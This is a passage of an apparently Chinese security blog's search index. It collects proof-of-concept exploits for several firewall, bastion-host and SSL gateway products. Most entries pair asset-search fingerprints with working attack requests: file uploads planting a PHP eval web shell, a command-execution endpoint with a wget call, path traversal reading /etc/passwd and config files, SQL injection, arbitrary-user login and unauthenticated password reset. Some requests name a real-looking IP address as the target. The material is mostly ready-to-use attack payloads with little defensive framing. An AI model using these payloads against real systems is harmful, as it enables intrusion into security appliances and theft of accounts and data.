","date":"2023-12-08","objectID":"/%E7%BB%BF%E7%9B%9F-nf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-bugsinfo-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"绿盟 NF下一代防火墙 bugsInfo 任意文件上传漏洞","uri":"/%E7%BB%BF%E7%9B%9F-nf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-bugsinfo-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞影响 绿盟 SSLVPN ","date":"2023-12-08","objectID":"/%E7%BB%BF%E7%9B%9F-nf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-bugsinfo-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"绿盟 NF下一代防火墙 bugsInfo 任意文件上传漏洞","uri":"/%E7%BB%BF%E7%9B%9F-nf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-bugsinfo-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"网络测绘 app=“NSFOCUS-下一代防火墙” ","date":"2023-12-08","objectID":"/%E7%BB%BF%E7%9B%9F-nf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-bugsinfo-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw"],"title":"绿盟 NF下一代防火墙 bugsInfo 任意文件上传漏洞","uri":"/%E7%BB%BF%E7%9B%9F-nf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-bugsinfo-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞复现 主页面 出现漏洞的端口为 8081 POST /api/v1/device/bugsInfo HTTP/1.1 Content-Type: multipart/form-data; boundary=1d52ba2a11ad8a915eddab1a0e85acd9 Host: --1d52ba2a11ad8a915eddab1a0e85acd9 Content-Disposition: form-data; name=\"file\"; filename=\"sess_82c13f359d0dd8f51c29d658a9c8ac71\" lang|s:52:\"../../../../../../../../../../../../../../../../tmp/\"; --1d52ba2a11ad8a915eddab1a0e85acd9-- POST /api/v1/device/bugsInfo HTTP/1.1 Content-Type: multipart/form-data; boundary=4803b59d015026999b45993b1245f0ef Host: --4803b59d015026999b45993b1245f0ef Content-Disposition: form-data; name=\"file\"; filename=\"compose.php\" \u003c?php eval($_POST['cmd']);?\u003e --4803b59d015026999b45993b1245f0ef-- POST /api/v1/device/bugsInfo HTTP/1.1 Content-Type: multipart/form-data; boundary=4803b59d015026999b45993b1245f0ef Host: --4803b59d015026999b45993b1245f0ef Content-Disposition: form-data; name=\"file\"; filename=\"compose.php\" \u003c?php eval($_POST['cmd']);?\u003e --4803b59d015026999b45993b1245f0ef-- POST /mail/include/header_main.php HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie: PHPSESSID_NF=82c13f359d0dd8f51c29d658a9c8ac71 Host: cmd=phpinfo(); ","date":"2023-12-08","objectID":"/%E7%BB%BF%E7%9B%9F-nf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-bugsinfo-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw"],"title":"绿盟 NF下一代防火墙 bugsInfo 任意文件上传漏洞","uri":"/%E7%BB%BF%E7%9B%9F-nf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-bugsinfo-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"# 绿盟 SAS堡垒机 Exec 远程命令执行漏洞\r","date":"2023-12-08","objectID":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-exec-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"绿盟 SAS堡垒机 Exec 远程命令执行漏洞","uri":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-exec-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞描述 绿盟 SAS堡垒机 Exec 远程命令执行漏洞 ","date":"2023-12-08","objectID":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-exec-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"绿盟 SAS堡垒机 Exec 远程命令执行漏洞","uri":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-exec-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞影响 绿盟 SAS堡垒机 ","date":"2023-12-08","objectID":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-exec-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"绿盟 SAS堡垒机 Exec 远程命令执行漏洞","uri":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-exec-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"网络测绘 body=\"’/needUsbkey.php?username=’\" ","date":"2023-12-08","objectID":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-exec-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw"],"title":"绿盟 SAS堡垒机 Exec 远程命令执行漏洞","uri":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-exec-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞复现 登陆页面 漏洞存在于文件 ExecController.php 文件中 \u003c?php require_once 'Nsc/Websvc/Response.php'; class ExecController extends Cavy_Controller_Action { var $models = 'no'; public function index() { $command = $this-\u003e_params['cmd']; $ret = 0; $output = array(); exec($command,$output,$ret); $result = new StdClass; if ($ret != 0) { $result-\u003ecode = Nsc_Websvc_Response::EXEC_ERROR; $result-\u003etext = \"exec error\"; } else { $result-\u003ecode = Nsc_Websvc_Response::SUCCESS; // $result-\u003etext = implode(\"\\n\",$output); $result-\u003etext = \"WEBSVC OK\"; } $this-\u003e_render(array('result'=\u003e$result),'/websvc/result'); } } ?\u003e 验证POC /webconf/Exec/index?cmd=wget%20xxx.xxx.xxx ","date":"2023-12-08","objectID":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-exec-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw"],"title":"绿盟 SAS堡垒机 Exec 远程命令执行漏洞","uri":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-exec-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"# 绿盟 SAS堡垒机 local_user.php 任意用户登录漏洞\r","date":"2023-12-08","objectID":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-local_user.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"绿盟 SAS堡垒机 local_user.php 任意用户登录漏洞","uri":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-local_user.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞描述 绿盟堡垒机存在任意用户登录漏洞，攻击者通过漏洞包含 www/local_user.php 实现任意⽤户登录 ","date":"2023-12-08","objectID":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-local_user.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"绿盟 SAS堡垒机 local_user.php 任意用户登录漏洞","uri":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-local_user.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞影响 绿盟 SAS堡垒机 ","date":"2023-12-08","objectID":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-local_user.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"绿盟 SAS堡垒机 local_user.php 任意用户登录漏洞","uri":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-local_user.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"网络测绘 body=\"’/needUsbkey.php?username=’\" ","date":"2023-12-08","objectID":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-local_user.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw"],"title":"绿盟 SAS堡垒机 local_user.php 任意用户登录漏洞","uri":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-local_user.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞复现 登陆页面 验证POC /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php\u0026method=login\u0026user_account=admin ","date":"2023-12-08","objectID":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-local_user.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw"],"title":"绿盟 SAS堡垒机 local_user.php 任意用户登录漏洞","uri":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-local_user.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\r:title=\"NSFOCUS SAS[H]\" ","date":"2023-12-08","objectID":"/%E7%BB%BF%E7%9B%9Fsas%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F-getfile%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"绿盟sas安全审计系统 GetFile任意文件读取漏洞","uri":"/%E7%BB%BF%E7%9B%9Fsas%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F-getfile%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc /webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd ","date":"2023-12-08","objectID":"/%E7%BB%BF%E7%9B%9Fsas%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F-getfile%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"绿盟sas安全审计系统 GetFile任意文件读取漏洞","uri":"/%E7%BB%BF%E7%9B%9Fsas%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F-getfile%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"网御 ACM 上网行为管理系统bottomframe.cgi SQL 注入漏洞 /bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23 ","date":"2023-12-08","objectID":"/%E7%BD%91%E5%BE%A1-acm-%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fbottomframe.cgi-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"网御 ACM 上网行为管理系统bottomframe.cgi SQL 注入漏洞","uri":"/%E7%BD%91%E5%BE%A1-acm-%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fbottomframe.cgi-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"# 网御 ACM上网行为管理系统 bottomframe.cgi SQL注入漏洞\r","date":"2023-12-08","objectID":"/%E7%BD%91%E5%BE%A1-acm%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-bottomframe.cgi-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"网御 ACM上网行为管理系统 bottomframe.cgi SQL注入漏洞","uri":"/%E7%BD%91%E5%BE%A1-acm%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-bottomframe.cgi-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞描述 网御 ACM上网行为管理系统 bottomframe.cgi 存在SQL注入漏洞，攻击者通过漏洞可以获取服务器数据库敏感信 ","date":"2023-12-08","objectID":"/%E7%BD%91%E5%BE%A1-acm%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-bottomframe.cgi-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"网御 ACM上网行为管理系统 bottomframe.cgi SQL注入漏洞","uri":"/%E7%BD%91%E5%BE%A1-acm%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-bottomframe.cgi-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞影响 网御 ACM上网行为管理系统 ","date":"2023-12-08","objectID":"/%E7%BD%91%E5%BE%A1-acm%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-bottomframe.cgi-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"网御 ACM上网行为管理系统 bottomframe.cgi SQL注入漏洞","uri":"/%E7%BD%91%E5%BE%A1-acm%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-bottomframe.cgi-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"网络测绘 “scripts/webcommon.js” ","date":"2023-12-08","objectID":"/%E7%BD%91%E5%BE%A1-acm%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-bottomframe.cgi-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw"],"title":"网御 ACM上网行为管理系统 bottomframe.cgi SQL注入漏洞","uri":"/%E7%BD%91%E5%BE%A1-acm%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-bottomframe.cgi-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞复现 登录页面 验证POC /bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23 ","date":"2023-12-08","objectID":"/%E7%BD%91%E5%BE%A1-acm%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-bottomframe.cgi-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw"],"title":"网御 ACM上网行为管理系统 bottomframe.cgi SQL注入漏洞","uri":"/%E7%BD%91%E5%BE%A1-acm%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-bottomframe.cgi-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rtitle=\"网神SecGate 3600防火墙\" ","date":"2023-12-08","objectID":"/%E7%BD%91%E7%A5%9E-secgate-3600-%E9%98%B2%E7%81%AB%E5%A2%99-app_av_import_save-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"网神 SecGate 3600 防火墙 app_av_import_save 文件上传漏洞","uri":"/%E7%BD%91%E7%A5%9E-secgate-3600-%E9%98%B2%E7%81%AB%E5%A2%99-app_av_import_save-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc POST / HTTP/1.1 Host: 111.121.226.71:4433 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc Accept-Encoding: gzip Content-Length: 421 ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"MAX_FILE_SIZE\" 10000000 ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"reqfile\";filename=\"fsdfsdfsdf.php\" Content-Type: text/plain \u003c?php print(md5(233)); ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"submit_post\" app_av_import_save ------WebKitFormBoundaryJpMyThWnAxbcBBQc-- https://111.121.226.71:4433/attachements/fsdfsdfsdf.php ","date":"2023-12-08","objectID":"/%E7%BD%91%E7%A5%9E-secgate-3600-%E9%98%B2%E7%81%AB%E5%A2%99-app_av_import_save-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"网神 SecGate 3600 防火墙 app_av_import_save 文件上传漏洞","uri":"/%E7%BD%91%E7%A5%9E-secgate-3600-%E9%98%B2%E7%81%AB%E5%A2%99-app_av_import_save-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rtitle=\"网神SecGate 3600防火墙\" ","date":"2023-12-08","objectID":"/%E7%BD%91%E7%A5%9E-secgate-3600-%E9%98%B2%E7%81%AB%E5%A2%99-obj_area_import_save-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"网神 SecGate 3600 防火墙 obj_area_import_save 文件上传漏洞","uri":"/%E7%BD%91%E7%A5%9E-secgate-3600-%E9%98%B2%E7%81%AB%E5%A2%99-obj_area_import_save-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc POST / HTTP/1.1 Host: 111.121.226.71:4433 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc Accept-Encoding: gzip Content-Length: 319 ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"reqfile\";filename=\"fsdfsdfsdf.php\" Content-Type: text/plain \u003c?php print(md5(233)); ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"submit_post\" obj_area_import_save ------WebKitFormBoundaryJpMyThWnAxbcBBQc-- https://111.121.226.71:4433/attachements/fsdfsdfsdf.php ","date":"2023-12-08","objectID":"/%E7%BD%91%E7%A5%9E-secgate-3600-%E9%98%B2%E7%81%AB%E5%A2%99-obj_area_import_save-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"网神 SecGate 3600 防火墙 obj_area_import_save 文件上传漏洞","uri":"/%E7%BD%91%E7%A5%9E-secgate-3600-%E9%98%B2%E7%81%AB%E5%A2%99-obj_area_import_save-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"# 网神 SecSSL 3600安全接入网关系统 未授权访问漏洞\r","date":"2023-12-08","objectID":"/%E7%BD%91%E7%A5%9E-secssl-3600%E5%AE%89%E5%85%A8%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%E7%B3%BB%E7%BB%9F-changepass.php%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"网神 SecSSL 3600安全接入网关系统 changepass.php任意密码修改漏洞 ","uri":"/%E7%BD%91%E7%A5%9E-secssl-3600%E5%AE%89%E5%85%A8%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%E7%B3%BB%E7%BB%9F-changepass.php%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞描述 网神 SecSSL 3600安全接入网关系统 存在未授权访问漏洞，攻击者通过漏洞可以获取用户列表，并修改用户账号密码 ","date":"2023-12-08","objectID":"/%E7%BD%91%E7%A5%9E-secssl-3600%E5%AE%89%E5%85%A8%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%E7%B3%BB%E7%BB%9F-changepass.php%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"网神 SecSSL 3600安全接入网关系统 changepass.php任意密码修改漏洞 ","uri":"/%E7%BD%91%E7%A5%9E-secssl-3600%E5%AE%89%E5%85%A8%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%E7%B3%BB%E7%BB%9F-changepass.php%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞影响 网神 SecSSL 3600安全接入网关系统 ","date":"2023-12-08","objectID":"/%E7%BD%91%E7%A5%9E-secssl-3600%E5%AE%89%E5%85%A8%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%E7%B3%BB%E7%BB%9F-changepass.php%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"网神 SecSSL 3600安全接入网关系统 changepass.php任意密码修改漏洞 ","uri":"/%E7%BD%91%E7%A5%9E-secssl-3600%E5%AE%89%E5%85%A8%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%E7%B3%BB%E7%BB%9F-changepass.php%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"网络测绘 app=“安全接入网关SecSSLVPN” ","date":"2023-12-08","objectID":"/%E7%BD%91%E7%A5%9E-secssl-3600%E5%AE%89%E5%85%A8%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%E7%B3%BB%E7%BB%9F-changepass.php%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw"],"title":"网神 SecSSL 3600安全接入网关系统 changepass.php任意密码修改漏洞 ","uri":"/%E7%BD%91%E7%A5%9E-secssl-3600%E5%AE%89%E5%85%A8%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%E7%B3%BB%E7%BB%9F-changepass.php%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞复现 登陆页面 验证POC，获取用户列表zkec GET /admin/group/x_group.php?id=2 Cookie: admin_id=1; gw_admin_ticket=1; 修改用户密码 POST /changepass.php?type=2 Cookie: admin_id=1; gw_user_ticket=ffffffffffffffffffffffffffffffff; last_step_param={\"this_name\":\"ceshi\",\"subAuthId\":\"1\"} old_pass=\u0026password=Asd123!@#123A\u0026repassword=Asd123!@#123A ","date":"2023-12-08","objectID":"/%E7%BD%91%E7%A5%9E-secssl-3600%E5%AE%89%E5%85%A8%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%E7%B3%BB%E7%BB%9F-changepass.php%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw"],"title":"网神 SecSSL 3600安全接入网关系统 changepass.php任意密码修改漏洞 ","uri":"/%E7%BD%91%E7%A5%9E-secssl-3600%E5%AE%89%E5%85%A8%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%E7%B3%BB%E7%BB%9F-changepass.php%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rtitle=\"网神SecGate 3600防火墙\" ","date":"2023-12-08","objectID":"/%E7%BD%91%E7%A5%9Esecgate-3600%E9%98%B2%E7%81%AB%E5%A2%99-sys_export_conf_local_save-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"网神SecGate 3600防火墙 sys_export_conf_local_save 文件读取漏洞","uri":"/%E7%BD%91%E7%A5%9Esecgate-3600%E9%98%B2%E7%81%AB%E5%A2%99-sys_export_conf_local_save-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc GET /?g=sys_export_conf_local_save\u0026file_name=../../../..//secgate/webui/config.inc HTTP/1.1 Host: 111.121.226.71:4433 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip ","date":"2023-12-08","objectID":"/%E7%BD%91%E7%A5%9Esecgate-3600%E9%98%B2%E7%81%AB%E5%A2%99-sys_export_conf_local_save-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"网神SecGate 3600防火墙 sys_export_conf_local_save 